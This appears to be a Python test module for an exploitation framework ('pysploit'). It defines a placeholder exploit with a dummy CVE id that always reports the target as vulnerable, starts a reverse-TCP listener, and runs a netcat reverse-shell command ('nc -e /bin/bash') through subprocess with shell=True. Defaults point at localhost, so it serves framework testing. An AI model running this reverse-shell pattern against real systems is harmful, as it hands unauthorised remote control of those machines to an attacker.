from exploits.exploit import Exploit
import subprocess
import uuid
from core.constants import REVERSE_TCP
from network.manager import NetworkManager
import threading
import subprocess

class test_reverse_tcp(Exploit):
	def __init__(self):

		# Exploit information
		super().__init__()
		self.vuln_name = "test_reverse_tcp"
		self.disclosure_ids = ["CVE-d34d-b33f"]
		self.vuln_reliability = "Excellent"
		self.vuln_type = "remote code execution"
		self.vuln_description = """
		This module should give you a shell on your system

		[pysploit docs]
		"""

		# User-set options
		self.options = {
			"victim_ip": "localhost",
			"victim_port": 31337,
			"attacker_ip": "localhost",
			"attacker_port": 31337,
			"payload": None
		}

	def check_vulnerability(self):
		print("[*] Checking vulnerability")
		print("\t[+] Yea we're vulnerable")
		return True

	def pop_reverse_shell(self):
		rev_command = "nc -e /bin/bash {} {}".format(self.options["victim_ip"], self.options["attacker_port"])
		print("\t\t\t[*] \'{}\'".format(rev_command))
		subprocess.Popen(rev_command, shell=True)

	def exploit(self):
		is_vulnerable = self.check_vulnerability()
		if is_vulnerable:
			self.network_manager = NetworkManager(self.session)
			self.network_manager.add_handler(REVERSE_TCP, self.options["attacker_port"])
			nm_thread = threading.Thread(target=self.network_manager.start)
			nm_thread.start()
			print("\t\t[*] Popping reverse shell")
			self.pop_reverse_shell()
			print("\t\t[+] Reverse shell popped")
		else:
			print("\t[-] Whoops not vulnerable. Something's broken")

	def run(self):
		self.exploit()